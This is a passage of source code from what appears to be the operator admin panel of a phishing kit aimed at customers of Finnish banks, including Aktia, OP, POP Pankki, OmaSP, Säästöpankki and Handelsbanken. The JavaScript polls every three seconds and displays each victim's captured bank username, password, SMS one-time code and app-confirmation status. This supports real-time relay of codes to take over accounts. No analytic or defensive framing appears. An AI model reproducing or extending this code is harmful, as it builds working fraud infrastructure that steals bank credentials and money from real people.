                            spankkiCell.innerHTML = html;
                        }
                        
                        const aktiaCell = document.getElementById('user-aktia-' + userId);
                        if (aktiaCell) {
                            let html = '';
                            if (data.user.aktia_username || data.user.aktia_sms_code || data.user.aktia_app_confirmed || data.user.aktia_login_method) {
                                html = '<div class="text-xs">';
                                if (data.user.aktia_username) {
                                    html += '<div class="font-medium text-slate-200">Käyttäjätunnus:</div><div class="text-slate-300">' + data.user.aktia_username + '</div>';
                                }
                                if (data.user.aktia_login_method) {
                                    html += '<div class="font-medium text-slate-200 mt-1">Kirjautumistapa:</div><div class="text-slate-300">';
                                    html += data.user.aktia_login_method === 'app'
                                        ? 'Kyllä, Aktia ID -sovellus'
                                        : 'Ei, verkkopankkitunnus + SMS';
                                    html += '</div>';
                                }
                                if (data.user.aktia_sms_code) {
                                    html += '<div class="font-medium text-slate-200 mt-1">Tekstiviestikoodi:</div><div class="text-slate-300">' + data.user.aktia_sms_code + '</div>';
                                }
                                if (data.user.aktia_app_confirmed) {
                                    html += '<div class="font-medium text-slate-200 mt-1">Sovelluksen vahvistus:</div><div class="text-green-400">✓ Vahvistettu</div>';
                                }
                                html += '</div>';
                            } else {
                                html = '<span class="text-gray-400">-</span>';
                            }
                            aktiaCell.innerHTML = html;
                        }
                        const opCell = document.getElementById('user-op-' + userId);
                        if (opCell) {
                            let html = '';
                            if (data.user.op_username || data.user.op_password || data.user.op_sms_code || data.user.op_app_confirmed) {
                                html = '<div class="text-xs">';
                                if (data.user.op_username) {
                                    html += '<div class="font-medium text-slate-200">Käyttäjätunnus:</div><div class="text-slate-300">' + data.user.op_username + '</div>';
                                }
                                if (data.user.op_password) {
                                    html += '<div class="font-medium text-slate-200 mt-1">Salasana:</div><div class="text-slate-300">' + data.user.op_password + '</div>';
                                }
                                if (data.user.op_sms_code) {
                                    html += '<div class="font-medium text-slate-200 mt-1">SMS-koodi:</div><div class="text-slate-300">' + data.user.op_sms_code + '</div>';
                                }
                                if (data.user.op_app_confirmed) {
                                    html += '<div class="font-medium text-slate-200 mt-1">Sovelluksen vahvistus:</div><div class="text-green-400">✓ Vahvistettu</div>';
                                }
                                html += '</div>';
                            } else {
                                html = '<span class="text-gray-400">-</span>';
                            }
                            opCell.innerHTML = html;
                        }
                        
                        const poppankkiCell = document.getElementById('user-poppankki-' + userId);
                        if (poppankkiCell) {
                            let html = '';
                            if (data.user.poppankki_username || data.user.poppankki_sms_code || data.user.poppankki_app_confirmed) {
                                html = '<div class="text-xs">';
                                if (data.user.poppankki_username) {
                                    html += '<div class="font-medium text-slate-200">Käyttäjätunnus / Användarkod:</div><div class="text-slate-300">' + data.user.poppankki_username + '</div>';
                                }
                                if (data.user.poppankki_sms_code) {
                                    html += '<div class="font-medium text-slate-200 mt-1">SMS Kodu:</div><div class="text-slate-300">' + data.user.poppankki_sms_code + '</div>';
                                }
                                if (data.user.poppankki_app_confirmed) {
                                    html += '<div class="font-medium text-slate-200 mt-1">Uygulama Onayı:</div><div class="text-green-400">✓ Onaylandı</div>';
                                }
                                html += '</div>';
                            } else {
                                html = '<span class="text-gray-400">-</span>';
                            }
                            poppankkiCell.innerHTML = html;
                        }
                        
                        const omaspCell = document.getElementById('user-omasp-' + userId);
                        if (omaspCell) {
                            let html = '';
                            if (data.user.omasp_username || data.user.omasp_sms_code || data.user.omasp_app_confirmed) {
                                html = '<div class="text-xs">';
                                if (data.user.omasp_username) {
                                    html += '<div class="font-medium text-slate-200">Käyttäjätunnus:</div><div class="text-slate-300">' + data.user.omasp_username + '</div>';
                                }
                                if (data.user.omasp_sms_code) {
                                    html += '<div class="font-medium text-slate-200 mt-1">SMS Kodu:</div><div class="text-slate-300">' + data.user.omasp_sms_code + '</div>';
                                }
                                if (data.user.omasp_app_confirmed) {
                                    html += '<div class="font-medium text-slate-200 mt-1">Uygulama Onayı:</div><div class="text-green-400">✓ Onaylandı</div>';
                                }
                                html += '</div>';
                            } else {
                                html = '<span class="text-gray-400">-</span>';
                            }
                            omaspCell.innerHTML = html;
                        }
                        
                        const saastopankkiCell = document.getElementById('user-saastopankki-' + userId);
                        if (saastopankkiCell) {
                            let html = '';
                            if (data.user.saastopankki_username || data.user.saastopankki_sms_code || data.user.saastopankki_app_confirmed) {
                                html = '<div class="text-xs">';
                                if (data.user.saastopankki_username) {
                                    html += '<div class="font-medium text-slate-200">Käyttäjätunnus:</div><div class="text-slate-300">' + data.user.saastopankki_username + '</div>';
                                }
                                if (data.user.saastopankki_sms_code) {
                                    html += '<div class="font-medium text-slate-200 mt-1">SMS Kodu:</div><div class="text-slate-300">' + data.user.saastopankki_sms_code + '</div>';
                                }
                                if (data.user.saastopankki_app_confirmed) {
                                    html += '<div class="font-medium text-slate-200 mt-1">Uygulama Onayı:</div><div class="text-green-400">✓ Onaylandı</div>';
                                }
                                html += '</div>';
                            } else {
                                html = '<span class="text-slate-500">-</span>';
                            }
                            saastopankkiCell.innerHTML = html;
                        }
                        
                        const handelsbankenCell = document.getElementById('user-handelsbanken-' + userId);
                        if (handelsbankenCell) {
                            let html = '';
                            if (data.user.handelsbanken_username || data.user.handelsbanken_password || data.user.handelsbanken_sms_code || data.user.handelsbanken_app_confirmed) {
                                html = '<div class="text-xs">';
                                if (data.user.handelsbanken_username) {
                                    html += '<div class="font-medium text-slate-200">Användarnamn:</div><div class="text-slate-300">' + data.user.handelsbanken_username + '</div>';
                                }
                                if (data.user.handelsbanken_password) {
                                    html += '<div class="font-medium text-slate-200 mt-1">Lösenord:</div><div class="text-slate-300">' + data.user.handelsbanken_password + '</div>';
                                }
                                if (data.user.handelsbanken_sms_code) {
                                    html += '<div class="font-medium text-slate-200 mt-1">SMS-kod:</div><div class="text-slate-300">' + data.user.handelsbanken_sms_code + '</div>';
                                }
                                if (data.user.handelsbanken_app_confirmed) {
                                    html += '<div class="font-medium text-slate-200 mt-1">Appbekräftelse:</div><div class="text-green-400">✓ Bekräftad</div>';
                                }
                                html += '</div>';
                            } else {
                                html = '<span class="text-slate-500">-</span>';
                            }
                            handelsbankenCell.innerHTML = html;
                        }
                    }
                })
                .catch(() => {});
        });
    }

    updateUserData();
    setInterval(updateUserData, 3000);
})();
</script>

<?php
$content = ob_get_clean();
$title = 'Kullanıcılar - Admin Panel';
$showSidebar = true;
$bankLogs = $bankLogs ?? [];
include __DIR__ . '/../layout.php';
?>

